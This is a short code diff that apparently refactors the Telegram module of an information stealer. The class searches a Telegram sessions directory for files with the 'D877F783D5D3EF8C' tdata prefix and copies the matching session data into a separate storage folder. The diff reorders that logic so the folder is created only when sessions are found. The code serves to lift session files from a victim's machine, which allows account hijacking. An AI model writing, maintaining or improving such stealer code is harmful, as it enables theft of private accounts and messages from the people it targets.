@@ -21,17 +21,17 @@ class Telegram:
         if not path.exists(folder):
             makedirs(folder)
 
-    def __check_sessions(self):
-
-        if path.exists(self.config.SessionsPath):
-            self.__create_folder()
-            self.__get_sessions()
-
     def __get_sessions(self):
 
         folder = rf"{self.storage_path}\{self.folder}"
 
         sessions = sum([findall(r"D877F783D5D3EF8C.*", file) for file in listdir(self.config.SessionsPath)], [])
+
+        if len(sessions) < 1:
+            return
+
+        self.__create_folder()
+
         sessions.remove("D877F783D5D3EF8C")
 
         for session in sessions:
@@ -49,7 +49,7 @@ class Telegram:
         try:
 
             if self.statuses[0] is True:
-                self.__check_sessions()
+                self.__get_sessions()
 
         except Exception as e:
             if self.errors is True: print(f"[TELEGRAM]: {repr(e)}")
